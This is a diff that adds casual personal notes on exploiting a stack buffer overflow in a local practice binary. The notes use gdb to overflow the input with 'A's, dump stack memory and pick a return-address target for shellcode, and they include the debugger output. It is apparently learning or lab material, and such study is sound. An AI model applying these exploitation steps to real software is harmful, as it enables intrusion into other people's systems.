@@ -1,0 +1,36 @@
+so, whatever you want to invoke depends on how you want your thing to be executed.
+
+you want to invoke shellcode? you need to look for retq within the function for the return address.
+you want to invoke a specific prebuilt function? look for push, its usually the first line of the assembly code of the function that youve decompiled
+
+
+in order to find the return address we first want for the shellcode, we need to input a bunch of something in order to find where the return address is:
+(i did it inside of gdb cause why not)
+gdb ./buffer-overflow (open and get in it)
+run $(python -c "print('A' * 200)")
+this should input a shit ton of As into the binary storage so we can find where it is.
+
+in order to find where you want to point your shellcode after you write the return address, run the following after youve executed the poc exploit with no ops:
+(gdb) run
+(gdb) info proc mappings   # Look for stack address range
+(gdb) x/50x $rsp           # Examine stack memory
+
+
+(gdb) x/50x $rsp
+0x7fffffffe2b8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2c8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2d8: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe2e8: 0xffffe300      0x00007fff      0x00040000      0x00000002
+0x7fffffffe2f8: 0x00400564      0x00000000      0x00000000      0x00000000
+0x7fffffffe308: 0x6b5c95c3      0x06219f14      0x00400450      0x00000000
+0x7fffffffe318: 0xffffe3b0      0x00007fff      0x00000000      0x00000000
+0x7fffffffe328: 0x00000000      0x00000000      0xa5dc95c3      0xf9de606b
+0x7fffffffe338: 0xc1f895c3      0xf9de70dd      0x00000000      0x00000000
+0x7fffffffe348: 0x00000000      0x00000000      0x00000000      0x00000000
+0x7fffffffe358: 0xffffe3d0      0x00007fff      0xf7ffe130      0x00007fff
+0x7fffffffe368: 0xf7de7fe6      0x00007fff      0x00000000      0x00000000
+0x7fffffffe378: 0x00000000      0x00000000
+(gdb) quit
+
+after running the correct commands, we can see i overflowed the first three addresses with As.
+straight after the buffer is usually where the return address is, so this could be a good candidate for what we need to point it to in order to execute shellcode.
